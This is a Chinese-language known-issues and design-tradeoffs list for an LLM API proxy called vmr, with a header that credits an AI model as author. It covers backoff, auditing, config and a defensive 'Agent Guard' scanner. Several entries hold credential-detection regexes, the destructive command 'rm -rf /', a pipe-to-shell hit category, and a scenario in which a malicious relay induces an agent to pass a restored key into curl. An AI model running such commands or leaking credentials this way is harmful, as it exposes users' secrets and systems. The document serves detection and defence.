<!-- Ver 2026-09-22 04:20, by Sonnet 5 -->

# vmr — Known Issues（已知问题与架构取舍清单）

> **定位**：vmr 已知问题、待评估演进项与刻意架构取舍的**唯一权威、持续维护的当前状态清单**。
> 发现新问题先在这里查一遍，再决定它是不是新的。
> **不在这里**：还没做的**新功能**（新视图 / 导出 / 信号）属产品路线，见 `ROADMAP`——与技术债性质不同，不并列排期。
>
> **维护原则**
> 1. **只记当前系统里还找得到的东西**：要么是待办（§2），要么是「看着像 bug、其实是有意为之」的取舍（§1）。**已修复的问题不进这里**——它已经不存在了，代码本身就是证明。那段历史在 `CHANGELOG.md` 和 git history 里。
> 2. **三类分区**：§1 确定不修（连同决策逻辑，避免被反复重新提出）｜§2 待定问题（分组、组内按用户价值 × ROI 排序）｜§3 跨组排期结论。
> 3. **每条都要能对源码核实**。核实不了的，说明已过期，删掉。
> 4. **散文可压缩、可重组**；§1/§2 的编号只是稳定身份标识，供历史引用对号，不承诺连续、也不代表顺序。源码注释不靠编号回指本文档——每条注释自带完整理由，本文档只在「这个取舍值得被独立追踪」时补一条 §1。
> 5. **不写演进史**。一条取舍只陈述当前结论与当前理由；被推翻的旧措辞直接替换，不留「原先如何、后来如何」的分层。

---

## 0. 当前状态

- **稳定性与安全性**：无凭证泄漏、并发竞态或服务阻断级别的缺陷；单机生产环境可稳定运行。`copyFlush` 异常路径下的 `respnorm` 查询方法全部互斥锁同步，`-race` 全绿并经端到端流式断开集成测试守护。
- **自动化基线**：`internal/archtest` 强制导入单向边界、文件/函数行数预算、文档引用完整性，全绿。`go test ./...` 全绿（`internal/...` 与 `cmd/vmr` 均含 `-race`）。
- **§2 分布**：高危 0；中危路由/配额半区 `2.2` / `2.17` / `2.127`、前端转义 `2.135`、LLM 解读层 `2.18` / `2.145` / `2.146` / `2.147`、分析口径 `2.128` / `2.129`、工程工具与运维入口 `2.153`、Agent Guard 在线与分析 `2.157`；其余均为低危。

---

## 1. 刻意取舍，不是缺陷

> 以下基于项目核心哲学（KISS / YAGNI / 单二进制 / 零代码侵入）做出，已论证过，不需要重新论证。
> **推翻其中任何一条是允许的，但必须先知道自己在推翻它，并给出新的理由。**

### 1.0 永久不做（架构红线）

语义缓存（对确定性编程/Agent 任务是正确性隐患）｜MCP 网关与工具执行拦截（不在标准 LLM API 线路上——**限定**：指不代理 MCP 协议、不介入客户端的工具执行路径；对标准 LLM API 响应体内 `tool_use.input` / `tool_calls.arguments` 等字段做内容审查不在此列，因为那 100% 发生在标准 LLM API 线路上，和 `respnorm` 检查 `usage` 字段属于同一类动作——`internal/guard` 的内容扫描正是在这条限定下立项的，见 Agent Guard 设计规范（已归档） §1.1(a)）｜Web UI / 内嵌 DB / RBAC / 分布式 / 跨实例 quota｜协议互译 / bypass 模式｜`.so` 运行时插件（坚持编译期 blank-import 注册）｜让价目表进实时路由热路径｜通用 HTTP provider（映射 DSL）｜更多 LLM 检测器 / 对比维度 / benchmark 维度（分析半区标 v1-complete，新增维度从默认冲动改为需理由的例外——`macro/guard.json` 的理由是它的数据源是新产生的审计字段 `audit.Record.Guard`，不是对既有数据的再切分）。

### 1.1 运行时与并发

- **`health.Registry` 全局互斥锁不分片**：单机场景锁持有只是纳秒级 map 读写，分片增复杂度无吞吐收益。
- **`health.Registry.Available` 无生产调用方，但不是死代码**：它是唯一无副作用的路由资格查询（`Acquire` 会占用 half-open 探针名额），`health` 与 `router` 的测试断言端点状态都靠它——用 `Acquire` 去查会改变被断言的状态。「无生产调用方」不等于「可删」。
- **`fails` 的语义是「当前退避曲线下的连续失败深度」，跨曲线切换重置为 1**：`ErrAuth`/`ErrEndpoint` 走 10min 起的 long 曲线，其余走 5s 起的 transient 曲线——两条曲线基数差 120 倍，共用一个深度计数器会让一串 5xx（transient 才退到 80s）后的一次 401 直接顶到 1h 封顶。**不适用于**：当作「这个端点历史上一共失败了多少次」的累计量。`internal/server/active_probe_test.go` 因此不能用 `fails >= 2` 当「走的是 ReportFailure 不是 ReportNeutral」的代理判据，只有 `last_error` 能区分两者。
- **`ReleaseProbe` 与 `ReportNeutral` 行为相同但保留为两个方法**：前者是「名额先还、健康结论稍后再报」（`forwardSuccess` 在流真正跑完前用它），后者是「这次结果对健康没有信息量，到此为止」。合一会让 `forwardSuccess` 的调用点读起来像已经下了终局结论，而它恰恰还没有。
- **探针成功只做衰减（`fails--`），真实流量成功才清零**：探针是 `max_tokens=300` 的小请求，对限流/上下文受压端点的成功率系统性高于真实的 20 万 token 请求——用最容易通过的信号解除对最容易失败流量的保护，正是 429→5s 冷却→探针成功→满额流量→429 的循环成因。由 `TestFlappingEndpointKeepsBackoff` 钉死的保证是「探针成功与真实失败交替时，深度永不回落到最浅档」；`fails>0` 期间对真实流量恒 `available=false`（last-resort 释放是唯一例外，见 §2.85）。**已知残留**：连续探针成功可把 `fails` 衰减到 0 并把端点放回常规池原优先级，对「慢而未死」的灰区上游构成池级振荡循环（transient 首档 5s 只降频）；根除方案登记在 §2.99，待触发。
- **退避冷却带 ±10% 抖动，且抖动也作用于已封顶的值**：封顶端点整点齐射正是抖动要防的场景，因此结果可超名义 cap 至多 10%。**例外**：`Retry-After` 路径不抖——那是上游指定的节奏，不是我们的估计。
- **Sticky 会话因并发饱和超时借道逃逸成功后，不改写 Sticky 指针（临时避峰不毁缓存），而非切向新端点**：当粘性端点 A 所在 Provider 并发满载且排队超时（`concurrency_queue`）后，请求会 failover 逃逸至备用端点 B 成功执行。此时系统刻意**不改写**会话的 Sticky 内存指针（`stickyEscaped` 保证指针仍留在 A）。**取舍考量**：若改写指针至 B，会导致后续轮次永久倒向 B，使此前在 A 上投入大量 token 建立的深层上下文 Prompt Cache 完全作废；而不改写指针能让后续轮次在 A 并发恢复后继续回流命中旧缓存。**潜在代价与边界**：若该轮请求在 B 上产生了显著的上下文增量（如长工具输出），第 3 轮回到 A 时，A 上仅有第 1 轮的旧缓存片段，新增部分需重新计算；且若 A 的并发持续饱和，后续轮次会连续发生排队等待。对于 DeepSeek 等长缓存生命周期上游，不改写的收益远大于改写；若后续在特定短缓存场景有强诉求，可通过端到端真实缓存命中率指标评估动态重绑指针机制。
- **后台探针按 requests 口径计 1，对 token 限额计 0**：探针消耗真实上游额度，`metric: requests` 的账号侧一定计数，本地账本不计就是系统性欠记。token 侧不解析探针 usage（响应体有 `probeBodyCap` 封顶），计 0 是诚实下界而非精确值。
- **`log_dir` 在 Unix 上被 `flock` 独占，第二个指向同目录的实例拒绝启动**：两个进程对同一 JSONL 做 housekeeping 会把两股 zstd 流交错写进同一归档，`rename` 之后**不可恢复**；同根还有双进程 O_APPEND 行交错与 quota 双写覆盖。锁文件 `.vmr-audit.lock`（0600）成为 `log_dir` 的常驻文件，不参与压缩与保留。**不适用于 Windows**：那里没有 flock，`acquireDirLock` 是 no-op——唯一临时文件名仍保证归档不被交错写坏，但双进程的其余后果依然可能发生。用 pidfile 替代会因崩溃残留把启动永久卡死，比问题本身更糟。`internal/livestats` 自带一把**独立**的同机制 flock（`.vmr-stats.lock`），因为它不寄生 audit：`-audit=false` 时 audit 锁根本不存在，而"不留正文仍要监控"是一等场景——第二个实例的 livestats 拿不到锁就降级为纯内存（不写 slim/rollup），不污染首个实例的归档。`internal/quota` 同理自带独立的 `.vmr-quota.lock`——由 `Flush` 惰性获取；只读加载 `Load()` 不受锁阻碍，确保 `vmr replay` 或第二个实例可在服务在线时正常读取配额初始账本并内存化运行；拿不到锁（另一进程持有）时 `Flush` 直接返回该错误（`dirty` 因此保持置位，`StartFlusher` 的去重日志会照常报出），Charge/Used 仍纯内存工作。三把锁（audit/livestats/quota）各自独立生效，互不代理，`-audit=false` 时也都不受影响。
- **`HealthKey` 取 SHA-256 前 4 字节**：单实例端点规模下碰撞概率可忽略。
- **健康状态机的退避冷却参数硬编码**：坚持「零调参」，不暴露难以科学校准的旋钮。
- **`copyFlush` 的 goroutine + channel 流水线**：避免在底层连接层设全局 Deadline 破坏 TLS/Header 超时语义。
- **客户端取消时不停止计费**：上游已生成的 token 厂商照收，路由侧照收才与账单对齐；改成不计费会让 `vmr analyze` 系统性低估消耗。取消的**传播**（中止上游连接）已通过 `BuildRequest(r.Context(), …)` 自动完成；取消的**检测/归类**（`router` 标 attempt、`server` 标审计 `Outcome` 为 `canceled`）需 `copyFlush` select 一次 `ctx.Done()`。
- **`respnorm.Read` 等待更多字节时返回 `(0, nil)`**：唯一消费方 `copyFlush` 显式处理；改成内部阻塞循环会让 idle 看门狗失去以读取为粒度的心跳。
- **`respnorm` 的 usage sniffing 不外移为 `router` 侧装饰器**：装饰器要在转发热路径每 chunk 多付一次接口调用；当前实现搭 `ingest` 已有的 per-chunk 循环，零额外开销。理由在 `internal/respnorm` 包注释末尾。
- **`respnorm` 的观测标记 `crlf_framing_suspected` / `thinking_process_pattern_detected` 不删**：字节未改动，只往审计 `norm` 串加一个标记，看似无消费者——实则被 `internal/reqdetail` 详单页逐条叙述，`thinking_process_pattern_detected` 另进 `internal/report` 的 `diagnosticNormMarker` → `EndpointRow.NormCounts`，作为「剥离规则是否失效」的跨请求频率预警。
- **`GET /health` 为存活探针而非就绪探针，永不因上游不可用返回非 200**：与上游健康绑定会让容器编排在所有供应商不可用时触发无休止重启，放大雪崩。需要就绪度的调用方消费 `/status` 的模型健康块。
- **`/status` 的 `traffic.requests` 含未鉴权/被拒请求**：口径是「进程见过多少 HTTP 请求」，不是「成功路由了多少」。精确语义在审计日志。
- **`traffic.by_status` 按请求（非 attempt）计数，且不保证 `ok+canceled+error == total`**：failover 中间 attempt 不计入，少数早断路径不记或记入 error。展示语义，非路由语义。
- **`/status` 的 `traffic.by_status` 在流式中途截断时记 `error`，与审计顶层 `outcome` 记 `ok` 口径不同（刻意不对齐）**：前者答「客户端是否拿到完整响应」，后者答「HTTP 交换是否在传输层正常完成」，各自口径内部自洽（`Telemetry.RecordOutcome` doc comment 与 `forwardSuccess` 调用点各自写了自洽说明）。
- **buffered / undecided 模式的 SSE 在上游中途断流时一律不 flush 已缓冲尾部**：`respnorm.Read` 错误分支只把**可安全交付**的字节交出去——非 SSE 响应 flush 部分 JSON（直连也是这个结果），SSE 仅 `modePassthrough` flush 尾部；`modeUndecided` / `modeBuffered` 一律不 flush，避免把未闭合的 `<think>` 泄漏给客户端（审计记 `truncated_withheld`）。随后 `forwardSuccess` 于全部记账之后 `panic(http.ErrAbortHandler)`，客户端 SDK 看到断掉的传输而非格式良好的空 200。这是「杜绝静默假成功」的硬要求，不是可优化的保守行为。
- **不对 HTTP 2xx 软拦截（如 MiniMax `input_sensitive`）做运行时 Failover，坚守字节保真透传**：个别厂商在触发内容合规拦截时返回 200 OK 且内嵌 `"input_sensitive":true`，同时给空回复或套话。不做 2xx 拦截与 failover 的三个理由：① **流式不可逆**——绝大多数 Agent 与生产请求走 SSE，首包与 200 状态行早已交付客户端，中途无法撤销再切候选；② **契约与计费违背**——上游已记 200 并扣配额，私自丢弃重试造成二次计费与延迟翻倍；③ **KISS/YAGNI**——其他主流厂商合规均返回标准 4xx，天然由 `handleErrorResponse` 归为 `ErrContent` 自动切换，为单一厂商的非流式边缘行为暴露配置项和运行时预读缓冲，给全体用户加认知负担。**当前方案**：`respnorm` 仅在审计层打 `soft_block_detected` 标记供排查，响应字节原样透传。事前关键词过滤是降低此类触发的唯一正规路线。
- **`respnorm` 缓冲区超 `bufferedCap`（8 MiB）即放弃规范化，转 opaque 原样透传**：`modeBuffered` / `modeUndecided` 缓冲越限时置 `s.opaque = true`、审计 `norm` 串加 `overflow_raw_passthrough`，把已缓冲字节原样 flush、后续字节直通。**已知代价**：这条路径不再走重写循环（`emitBlock`），因此**虚拟模型名改写在本条响应上不发生**——响应体留的是上游真实模型名。刻意取舍：失控流（缺 `[DONE]`、无限增长的 `<think>`）继续攒内存、或对超大 body 强行 splice，都比「这一条响应模型名没改写」更糟；opaque 透传正是直连的等价行为。`TestRespStream_UndecidedOverflowDegradesToOpaque` 反向锁死这条降级不再经重写路径。触发面：单条响应体量到 MiB 级且带 `model` 字段——正常聊天/Agent 流量下不出现。
- **厂商专属协议约束拒绝归 `core.ErrQuirk`，不复用 `ErrContextLimit`**：DeepSeek 思考模式要求回传 `reasoning_content`、Google 要求回传 `thought_signature` 这类「换个端点就好」的拒绝，`DefaultClassify` 归入专门的 `ErrQuirk`（切换 + 零冷却）。复用 `ErrContextLimit` 能得到相同 failover 行为，但审计标签会说谎——这不是上下文超限。OAuth 标准错误码同理独立归 `ErrAuth`。全量端点级 quirk 模块方向见 §2.48。
- **`/status` 端点项刻意不加端点级累计计数器（requests / ok / failed / tokens）**：`consecutive_failures` 出现在 `/status` 因为它是**当前健康状态**读数（liveness 视图）。端点级累计账是**分析半区**职责——`internal/report` 的 `EndpointRow` 已完整产出，数据源可持久化、可按时间切片。给 `/status` 塞一份进程内、重启即失的实时副本：① 与分析半区双账本（正是「一个分析数字复现一个路由数字必须差分测试锁定」要防的负担）；② 做全等于给 `router.Telemetry` 加一张按端点的动态 map，破坏它「全固定原子、热路径零 map 零锁」的设计。
- **控制台首屏 Requests 与 Tokens 首选持久化账本（`stats.daily[]`）而非 `telemetry`**：`router.Telemetry` 纯内存，重启即归零；而 `livestats` 在启动时自动恢复并合并当日本地日历日的持久化 rollup 与 slim WAL。若大数字取持久化、斜杠右侧 total 取 `telemetry`，重启后会出现「大数字显示今日累计数千请求，而右侧 total 仅为 0」的严重割裂。因此控制台首屏左右两侧均统一聚合自同一份持久化账本（以服务端时区 RFC3339 日期前缀判定「今日」），仅在统计账本未启用时降级回退至 `telemetry`。
- **审计响应方向不单独落盘上游原始 Body**：避免为每请求存两份几乎相同的全量响应体。`audit.Attempt` 响应方向 `Body` 为空，交付给客户端的响应体由 `Client.Response.Body` 统一记录；上游与客户端之间的全部改动由 `Attempt` 的 `Norm`（改写步骤列表）、`RawPreStrip`（剥离前的原始片段）与 `ObservedModel`（上游实际返回的模型名）精确记录，足以复现与审计上游真实响应。
- **`system.disk.free_space` 在 Windows 上是桩（恒 0）**：`syscall.Statfs` 无 Windows 等价物，而 Windows 不是目标部署平台。
- **`/log` 慢订阅者以「丢行 + 标记」处理，永不让日志热路径阻塞**：每订阅者一条有界 channel（`subBuffer` 行），满则丢行插 `... dropped N lines ...` 标记；`log.html` 不做自动重连（只手动重试按钮），避免重启风暴下的重连洪水。
- **启动 banner 与 panic 直写 stderr，tee 不捕获**：banner 只出现一次，panic 时进程将死，两者都不值得为 `/log` 引入第二条写入路径。

### 1.2 配置与协议

- **协议枚举命名为 `openai-completions` / `anthropic-messages` / `openai-responses`，路由侧零兼容负担**：**唯一兼容咽喉点**是 `audit.Record.UnmarshalJSON`——读到旧名经 `audit.CanonicalProtocol` / `audit.NormalizeEndpointLabel` 归一化，只服务分析侧读历史日志；`vmr replay` 不做兼容；config 带旧名是加载错误（strict YAML），但错误信息直接点名要改成什么（`internal/config/provider.go` 的 `unknownProtocolHint`）。**这是「版本必须匹配、不做兼容」原则的唯一刻意例外**——历史审计文件是不可变的既存事实。**拆除条件是事实，不是日期**：审计日志默认永不删除（`retention_days: 0`），旧协议名不会随时间自然消失，按日期排期必然误伤。前提改为：对当前全部审计语料 grep 旧协议名零命中，且用户确认没有离线归档需要再解析；满足后拆 `internal/audit/legacy_protocol.go`、`Record.UnmarshalJSON` 及其为此新增的 `internal/core` import 与两个 legacy-name 归一化测试。**不适用于**：把审计日志投递到外部归档、或从别的机器拷入历史日志的场景——那里旧名可能随时重新出现，兼容层应当永久保留。
- **CLI 与 Server 版本必须匹配，不一致直接报错不做兼容**：单二进制、可随时重启，`vmr status` 与 `vmr start` 理应同版本——不一致说明升级没走完，报错正是暴露它。`json.RawMessage` 式兼容层只覆盖一个滚动升级窗口却永久留在代码里，违反 KISS。此原则不留任何字段级例外。
- **`/status` 的 `instance.base_urls` 回显请求自身地址而非 `listen` 配置**：host 取自 HTTP Host 头、scheme 取自是否 TLS——调用方用什么地址访问 `/status` 就广告什么地址，这正是客户端该填的值。纯展示、不参与鉴权或路由，Host 可伪造无安全影响；刻意不做 `X-Forwarded-Host` 解析。
- **`base_url` 内嵌凭据在加载期报错，而不是在审计侧脱敏**：`base_url` 是自由字符串，`https://u:p@host` 或 `?api_key=...` 会原样进 `Attempt.URL` 落盘——审计脱敏只覆盖 header，这是脱敏模型的唯一旁路。在源头消灭比运行期脱敏正确：脱敏是永远追不全的黑名单。**适用于**：固定的凭据键名清单（`api_key`/`token`/`secret`/`password` 等）与 userinfo 段。**不适用于**：自定义网关用非常规键名承载凭据的情形——刻意不做「值看起来像 key」的启发式判断，那会误杀 `api-version` 这类合法参数。错误信息只回显键名，绝不回显值。
- **Agent Guard（`internal/guard`）的 `sk-` 泛前缀规则永远是 Tier 2（仅供离线人工复核），不得升为 Tier 1 或用作任何在线改写/阻断依据（K-G5）**：`tools/guard_corpus_scan` 对本仓真实审计日志的复现扫描证实了 Agent Guard 设计规范（已归档） §2.3 的结论——即使加上左边界锚点（`(?:^|[^A-Za-z0-9_+/=-])`，已消除「`task-specific`/`ask-user-question` 之类英文单词子串」这一类误命中），`sk-[A-Za-z0-9_-]{20,}` 仍然只是一个开放式形状匹配，锚定强度不如 `openai-legacy-key` 这类定长规则。**适用于**：任何"要不要把 `sk-` 泛前缀提到 Tier 1"的提议，先看这条。**不适用于**：五锚齐备（左边界+字面前缀+定长+字符集+熵）的具体厂商规则（`sk-ant-api03-`/`sk-proj-`/`AKIA`/`AIza`/`ghp_`/`hf_` 等），那些已经是 Tier 1。M0-M2 已全部实现：`guard.Engine`/`ScanText`/`ClassifyRunes`/`InspectToolCall`/`Fingerprint`（离线双向检测核心）、`audit.Record.Guard` 契约、`vmr analyze` 的出向权威盖章+离线补扫（M2.2）、入向 Unicode/Tool Call/凭据回显取证（M2.3）、Provider 暴露面归因（M2.4），`macro/guard.json` 在真实语料上确认产出非空数据。M3 出向干预（M3.0–M3.6）已在线落地（出向扫描/阻断、配置校验；此前的 replace/伪名还原模式已随第一性原理复审整体移除——见 K-G1；Salt 持久化机制后又随 K-G19 整体移除，`Hit.FP` 改为确定性哈希）。M4 入向干预已收窄为仅 Unicode 隐写净化（SSE 双级闸门、三协议熔断帧、非流式 403 已随第二轮第一性原理复审整体移除——见 K-G15/ADR-15）。**仍未实现**：Journey 步骤级安全标注（M2.5，`internal/journey` 行数预算紧张 + 需要先有真实数据验证渲染效果，优先级低于宏观三块）、供应链 typosquat/fraud（M2.6，登记 `docs/ROADMAP.md` R6）。
- **`guard.Engine` 的并发安全与 Aho-Corasick 字面量预筛不是 M2 的准入条件，维持 M3**：分析半区对 `Engine` 的唯一调用路径是 `internal/report/aggregate.go` 的 `scanFiles`→`ingestRecord`→`guardCollector.add`，**单 goroutine 顺序 `for` 循环**（`buildInternal` 先阻塞跑完按文件 fan-out 并行的 `AnalyzeSessionsCached` 拿到 `sess`，那个并行阶段只做会话/任务分组、从不调用 `Engine.Scan`，再调用 `st.scanFiles`，两者依次执行，不是并发）。因此离线补扫（M2.2/M2.3）用一个包级单例 `*guard.Engine`（`internal/report/guardscan.go` 的 `guardEngine()`）贯穿整个 `vmr analyze` 运行即可，零并发风险，不需要拆分"不可变规则表 + 调用方扫描态"，也不需要 AC 自动机；真实语料实测（62 文件/59,025 条记录）guard 扫描相对不含 guard 的基线增量 +22.4%，在性能预算内。**Engine 并发安全与 AC 自动机维持不做**：在线每请求 goroutine 的挂载方式还没定，提前设计只能是猜测——留到 M3 出向接线设计阶段与挂载方式一并定。**适用于**：任何"要不要把 AC 自动机/Engine 并发模型提前到 M2"的提议。
- **`private-key-block` 规则的 `Hit.FP` 是"密钥类型指纹"，不是"单条私钥的唯一指纹"**：附录 A 的模式 `-----BEGIN [A-Z ]*PRIVATE KEY-----`（`internal/guard/rules.go`）只捕获 PEM 头部这一行，不含其后的 base64 密钥体，因此同类型（如都是 `RSA PRIVATE KEY`）的不同私钥会产出相同 `FP`——这是设计文档 Appendix A 规则定义本身的产物，不是实现偏差。**已决定维持现状，不改正则**：真实语料至今 0 命中，手写一条跨多行、跨 JSON 转义序列的正则却没有真实私钥泄露样本可供校准，出错的风险高于修正一个当前从未被触发过的精度缺口。**适用于**：任何"为什么同一类私钥的多次命中在 `vmr analyze` 里显示成同一个指纹"的疑问。**触发条件**：出现真实私钥泄露样本时，再评估是否值得扩展正则匹配完整 PEM 块。
- **`tools/guard_corpus_scan -deep` 的 Tool Call/高危命令库/凭据回显检测对流式响应完全失效，产出不入库**：`-deep` 模式对响应体做 `json.Unmarshal(respBytes, &struct{})` 提取 Tool Call，要求 `respBytes` 是一个 JSON 对象——但本仓真实流量以流式（SSE）为主，流式响应存的是一整段 JSON 字符串，整体 `Unmarshal` 必然出错，因此这条路径对流式响应从未真正解析出过一次工具调用，只覆盖真实工具调用的约 0.06%。真正的检测路径（`vmr analyze`/`internal/report`）不受影响，因为它用 `chatmsg.ReassembleSSE` 正确重组后再交给 `guard.InspectToolCall`。历史 `-deep` 模式产出的分析报告与 JSON 数据集（`agent-guard-corpus-deep-analysis.json`/`-report.md`）因此(a) Tool Call/高危命令库/回显三项数字不可信，且 (b) 为便于人工复核保留了候选凭据的脱敏预览（首尾字符+长度+命中路径+时间戳），其中若干条未被确认为测试夹具——两个原因叠加，已把这两个文件加入 `.gitignore`，不提交入库（`-deep` 的默认输出路径也已从 `docs/design/` 改至 `reports/`，同样被 gitignore 覆盖——防止下次重跑再把含凭据预览的取证产物生成在易被 `git add -A` 误带入的位置），只留 `guard` 的 `testdata/corpus_scan.json`（纯聚合数字，不含任何预览/路径/时间戳）作为可复现的官方 M0 校准产物。**适用于**：任何"要不要把 `-deep` 产物提交入库"或"引用 `-deep` 的 Tool Call/回显数字"的提议。
- **`InspectToolCall` 对未分类工具（`unknown` 类别）只做凭据外带与凭据回显检查，不跑命令模式匹配（K-G6）**：MCP 生态下工具名不可枚举，一个叫 `search_docs` 的工具参数里出现 `rm -rf /` 完全可能只是在搜索文档；命令模式库只对 `ClassifyToolName` 判为 `command` 的工具生效（`internal/guard/toolinspect.go`）。这是防误杀的刻意选择，不是覆盖不全的疏漏。
- **变体选择符类字符（ZWNJ/ZWJ/LRM/RLM、`U+FE00`–`U+FE0F`、`U+E0100`–`U+E01EF`）只计数标记，不作为删除对象（K-G7）**：它们是波斯语、印地语、阿拉伯语排版与全部 ZWJ emoji 序列的必需字符（`internal/guard/runes.go` 的 `RuneCatVarSel`）；两个月良性语料里这类字符命中 2,947 次、几乎全是 emoji 表现选择符（Agent Guard 设计规范（已归档） §2.3），无差别删除会当场破坏这些正常内容。M4 的在线净化器已按此落地：只对 A/B 档做删除动作，C 档只计数标记绝不删除。
- **Tool Call 护栏只审查结构化工具参数，纯文本 `content` 绝不拦截（K-G8）**：`internal/guard.InspectToolCall` 的输入固定是 `tool_calls[].function.arguments` / `tool_use.input` 一类已装配完整的实参，从不下探到助手的自由文本回复。模型解释"为什么不要执行 `rm -rf /`"是完全正常的输出，在纯文本里拦截是误杀之源。
- **安全阻断相关的 `core` 错误类别 `ErrSecurity`（已删除）随入向在线拦截整体移除失效（K-G9，编号不复用）**：入向在线干预（Tool Call 闸门、协议熔断帧、非流式 403）随第一性原理复审（2026-09-16）整体移除——见 Agent Guard 设计规范（已归档） ADR-15；入向在线唯一剩下的动作是 Unicode 隐写净化，从不阻断、不合成协议帧、不改变状态码，因此不存在"安全阻断该不该罚健康分"这个问题了。**适用于**：任何"要不要恢复入向在线拦截"的提议，先读 K-G15。
- **`GuardRecord.Ver` 标记指纹全集版本，规则集升级使新旧 `Hit.FP` 不可比（K-G4）**：规则集版本升级会改变规则/指纹全集，同一凭据在新旧版本下派生出不同 `Hit.FP`，跨版本聚合"同一凭据重复出现"时会漏配对——这是指纹的固有属性，不是 bug。`internal/audit/guard.go` 的 `Ver` 字段已按此前提设计（每条记录盖章生成时的规则集版本）；`vmr analyze` 在版本切换点给出提示是配套工作，不改变这条结论本身。参见 Agent Guard 设计规范（已归档） ADR-12。
- **`mode: replace`（出向伪名化 + 响应端还原）已整体移除，唯一正确的出向干预是 `block`（K-G1）**：第一性原理复审（2026-09-15）裁定移除，理由有三：① 还原器本质上是一个解密预言机——中转站若在响应里回显伪名并诱导执行（例如塞进 `curl` 实参），还原等于主动把真钥双手奉上；且 ADR-6 早已承认 replace 防不了会篡改响应的主动中间人（AC-1），面对 AC-1 唯一正确的出向模式是 `block`；② replace 的唯一增量价值是"凭据在场时请求仍成功"，而真实语料中全部命中都是事故性粘贴（.env 模板、活跃 JWT 误发），对事故性粘贴来说"请求失败"正是期望行为，摩擦即特性；③ 独立复核（R-1/R-2/R-3/R-4/R-6）的缺陷密度高度集中在 replace/restore 机器上。移除后出向只剩 `off`/`audit_only`/`block`；配置里再声明 `replace` 是加载错误。经 Git 历史核实，`mode: replace` 从未进入任何已发版 Tag，没有真实生产记录需要兼容，相关兼容字段与 replay 影子分支已整体拔除。**适用于**：任何"要不要恢复伪名化/响应端还原"的提议——先重读上面三条。
- **入向在线拦截（Tool Call 双级闸门、协议熔断帧、非流式阻断、opaque/oversize 阻断分支）已整体移除，入向在线唯一剩下的动作是 Unicode 隐写净化（K-G15）**：第一性原理复审（2026-09-16）裁定移除，三条理由：① 客户端自己的审批门与沙箱是更正确、信息量更大的拦截位置——同一个"要不要放行这条命令"的判断，VMR 在信息量更少的位置重做，只会拿到一份更差的判断；② 缺陷密度实证——两轮独立复核（发现已转登记本文件，报告本身不入库）合计十余条问题里九条集中在这套机制上：`protected_paths`/`blocked_command_categories` 两个配置项完整解析校验却从未接线（死配置）、在线三处凭据回显检查恒传 `known=nil`、一级预筛确认预算易被烧穿、确认窗口小于部分高危模式实际跨度、多 choice 场景硬编码只看 `Choices[0]`；③ 默认 `audit_only` 且从未在生产流量上验证过判定精度，没有可行的放量路径。移除后 `guard.inbound` 从 7 个字段收窄到 1 个（`sanitize_invisible_runes`），`config.GuardInbound` 的对应字段整体删除（不是保留字段拒绝新值）；`core` 的 `ErrSecurity` 错误类别、`audit` 的 `BlockInfo` 类型、`GuardRecord.Block` 字段一并删除，**不**留解码兼容位——核实后确认入向在线拦截从落地到移除之间没有任何一次真实 `vmr start` 运行产生过带这些字段的审计记录，与 K-G1 对 `mode: replace` 的处理（保留兼容位）是基于可验证事实的差异，不是标准不一致。检测层纯函数（`InspectToolCall`）与离线取证不受影响，继续由 `report/guardscan.go` 消费。**适用于**：任何"要不要把 Tool Call 闸门/协议熔断帧加回来"的提议，先读上面三条与 Agent Guard 设计规范（已归档） ADR-15。
- **`macro/guard.json`（及其 Markdown 呈现）描述的是已经发生的事，不是被拦截的事（K-G14）**：报告里出现一条 `pipe_to_shell` 命中，含义是"客户端当时已经收到了它"，**从未被拦截过，也不会被拦截**——离线扫描只有取证能力，入向在线的唯一动作是 Unicode 隐写净化（ADR-15），没有任何拦截能力。`internal/i18n/report_guard.go` 与 `internal/report/viewmodel_guard.go` 的措辞均按此写（"本节只做离线呈现，不做任何在线拦截或改写"）。
- **出向 guard 永不改写请求体，`Client.Request.Body` 与 `Attempt.Request.Body` 在现行模式下恒等（K-G3）**：`mode: replace` 移除后（K-G1），`internal/server/guard.go` 的 `applyOutboundGuard` 只观测（audit_only）或拒绝（block），三种模式都不改写 body；`vmr replay` 也始终只读 `Client.Request.Body`。**适用于**：任何"审计日志里怎么还能看到原始凭据"的疑问——这是设计使然（本地单机 0600 权限保护），不是泄露。
- **在线/离线对 `\u` 转义编码凭据存在检出行为分歧（K-G16）**：在线引擎（`guard.Engine.Scan`）与标定工具工作在原始 JSON 字节流上，为了维持热路径零分配与高性能，不展开 JSON 字符串值内的 `\uXXXX` 转义；若凭据被写为转义形式（例如 `\u0073k-ant-...`），在线路径不会命中。而离线分析（`report.guardscan`）在遍历 Go `json.Unmarshal` 解码后的 AST 树时，叶子节点已是 UTF-8 解码文本，走 `ScanText` 扫描，能检出转义编码的凭据。威胁模型分析：本系统的主要防御场景是开发者或 Agent 事故性明文粘贴凭据（.env 文件、活跃 JWT 复制粘贴），刻意使用 `\u` 转义绕过出向阻断不在当前威胁模型内；为了边缘规避场景在热路径上引入全量转义解码开销属于过度设计，因此刻意接受该差异。两半区行为由差分测试锁定。
- **Agent Guard 的 Aho-Corasick 字面量预筛（`prefilter.go`）保留，不降级为 11 次 `bytes.Contains` 线性扫描（K-G17）**：过度设计复核指出对当前 11 条规则、典型请求体量级而言两者吞吐差异可忽略，但 `scanValue` 是对每个 JSON 字符串叶子值单独调用——不能排除单个叶子值本身就是几百 KB（整段代码/日志粘贴）的退化输入，此时 AC 的 O(N) 保证优于线性扫描的 O(N×规则数)。降级只换来约 300 行代码量减少，不修复任何 bug、不提升任何指标，且改动正落在 fuzz 覆盖的热路径上，需要重新过一遍现有 fuzz/benchmark 才能确认行为不变。**决定**：维持现状，不做，不再作为待办反复提出。
- **`toolinspect.go` 保留在 `internal/guard`，不物理搬迁到 `internal/report`（K-G18）**：过度设计复核确认 `toolinspect.go` 是 100% 离线消费（ADR-15 后），但它的两个调用方（`report/guardscan.go`、`tools/guard_corpus_scan`）**本来就已经** import `internal/guard`（要用 `Engine`/`Fingerprint` 等在线离线共用的检测层）——搬迁不会消除任何一条真实 import 边，只是把同一份代码换个目录，且文件顶部已有"Offline-only consumer since ADR-15"的清晰声明。**决定**：维持现状，不做。
